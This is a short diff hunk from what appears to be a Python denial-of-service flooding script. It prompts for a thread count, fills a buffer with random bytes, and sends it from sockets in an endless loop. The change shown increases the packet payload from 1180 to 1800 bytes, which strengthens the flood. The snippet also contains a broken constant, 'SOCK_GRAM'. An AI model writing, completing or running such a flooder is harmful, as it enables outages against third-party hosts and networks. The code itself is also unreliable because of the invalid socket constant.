@@ -12,7 +12,7 @@ threads_mostoas = int(input("Thread Dari Mostoas : "))
 os.system("clear")
 
 def mostoas():
-    asu = random._urandom(1180)
+    asu = random._urandom(1800)
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
